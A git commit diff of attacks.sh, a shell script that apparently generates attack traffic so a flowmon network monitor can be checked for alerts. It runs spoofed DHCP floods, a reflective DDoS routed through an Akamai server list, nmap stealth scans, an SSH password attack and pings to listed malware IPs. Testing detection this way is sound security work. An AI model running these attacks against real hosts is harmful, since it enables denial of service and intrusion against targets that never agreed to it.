45d7cb0ffb027701efd31dac00003cffc0dbe144
malachico <malachicohen@gmail.com>
2016-08-31 09:11:16 +0300

    to docker containers

--- attacks.sh
+++ attacks.sh
@@ -4,7 +4,7 @@
 # Author: Malachi Cohen
 
 # In linux we need to be root in order to generate traffic online (in most cases)
-su
+su root
 
 ########################### variables
 # Victim address
@@ -23,17 +23,14 @@ function print_end {
 # This function send IP-ICMP paket to top spammers. flowmon should alert about it
 # -c : send 1 packet
 # -W : time to wait to response
-function communicate_with_spammers {
-    ping 1.22.26.83 -W 0 -c 1
-    ping 1.160.44.67 -W 0 -c 1
-    ping 2.37.232.150 -W 0 -c 1
-    ping 2.39.80.25 -W 0 -c 1
-    ping 2.50.21.245 -W 0 -c 1
-    ping 2.90.17.230 -W 0 -c 1
-    ping 5.149.215.56 -W 0 -c 1
-    ping 5.149.221.143 -W 0 -c 1
-    ping 5.153.129.6 -W 0 -c 1
-    ping 8.30.124.6 -W 0 -c 1
+function communicate_with_malwares {
+    ping 98.131.229.2 -W 0 -c 1
+    ping 98.131.172.1 -W 0 -c 1
+    ping 98.131.132.1 -W 0 -c 1
+    ping 96.30.28.181 -W 0 -c 1
+    ping 103.31.186.29 -W 0 -c 1
+    ping 119.18.61.133 -W 0 -c 1
+    ping 176.31.28.226 -W 0 -c 1
 }
 
 
@@ -47,7 +44,7 @@ function communicate_with_spammers {
 # n.b : the list of the IPs can be found in : https://www.malwaredomainlist.com/mdl.php
 print_start "Blacklist"
 # Ping the malware IP.
-ping 93.190.140.162 -c 1
+communicate_with_malwares
 # ping google
 ping google.com -c 1
 print_end "Blacklist"
@@ -55,11 +52,14 @@ print_end "Blacklist"
 
 # DHCP anomaly
 # detect increased traffic of DHCP
-# Send 1000 dhcp request with spoofing client 0.0.0.0
+# Send 100 dhcp request with spoofing client 0.0.0.0
 print_start "DHCP increased traffic anomaly"
-for i in `seq 1 1000`;
+for i in `seq 1 100`;
     do
-            sudo dhcping -r -t 0 -c 0.0.0.0
+            dhcping -r -t 0 -c 0.0.0.0 > /dev/null
+            if ! ((i % 10)); then
+                echo "$i spoofed DHCP requests were sent."
+            fi
     done
 print_end "DHCP increased traffic anomaly"
 
@@ -79,7 +79,12 @@ print_end "simple dos attack"
 # -n : number of threads
 print_start "reflective DDoS"
 cd reflective_ddos
-python ARDT.py -l akamai_servers_list.txt -t ${VICTIM} -r ExampleHTTPReq.txt  -n 10
+for i in `seq 1 10`;
+    do
+            python ARDT.py -l akamai_servers_list.txt -t ${VICTIM} -r ExampleHTTPReq.txt  -n 10 >> /dev/null
+            echo "finished $i iterations out of 10!"
+    done
+cd ..
 print_end "reflective DDoS"
 
 # communicate directly with the internet
@@ -90,46 +95,32 @@ ping google.com -c 1
 print_end "connect to internet"
 
 
-# 12 DOS
-# Dos Attack - flowmon should alert about it
-print_start "ddos attack"
-python dos.py ${VICTIM}
-print_end "ddos attack"
-
-
-# Communicate with top spammers according to McAfee.
-# Dor further details: http://www.mcafee.com/threat-intelligence/ip/spam-senders.aspx
-print_start "spammers check"
-communicate_with_spammers
-print_end "spammers check"
-
-
 ### Port scanning ###
 # We do stealth sys scan to check whether flowman detects port scanning
 # This should also find icmp type 3 (port unreachable) anomaly
 
 # SYN scan
 print_start "SYN port scanning"
-nmap -sS ${VICTIM}
+sudo nmap -sS ${VICTIM}
 print_end "SYN port scanning"
 
 # FIN scan
 print_start "FIN port scanning"
-nmap -sF ${VICTIM}
+sudo nmap -sF ${VICTIM}
 print_end "FIN port scanning"
 
 # XMAS scan
 print_start "XMAS port scanning"
-nmap -sX ${VICTIM}
+sudo nmap -sX ${VICTIM}
 print_end "XMAS port scanning"
 
 # NULL scan
 print_start "NULL port scanning"
-nmap -sN ${VICTIM}
+sudo nmap -sN ${VICTIM}
 print_end "NULL port scanning"
 
 # UDP scan
-nmap -sU ${VICTIM}
+sudo nmap -sU ${VICTIM}
 # SSH attack
 print_start "ssh attack"
 python ssh_attack.py ${VICTIM} common_passwords.txt
@@ -166,7 +157,10 @@ sudo ifconfig ${INTERFACE} mtu 9000 up
 print_start "Telnet anomaly"
 for i in `seq 1 100`;
     do
-            sudo nc -p 23 -w 0.1 google.com > /dev/null
+            sudo nc -p 23 -w 0.1 google.com 2> /dev/null
+            if ! ((i % 10)); then
+                echo "$i telnet requests were sent."
+            fi
     done
 print_end "Telnet anomaly"
 
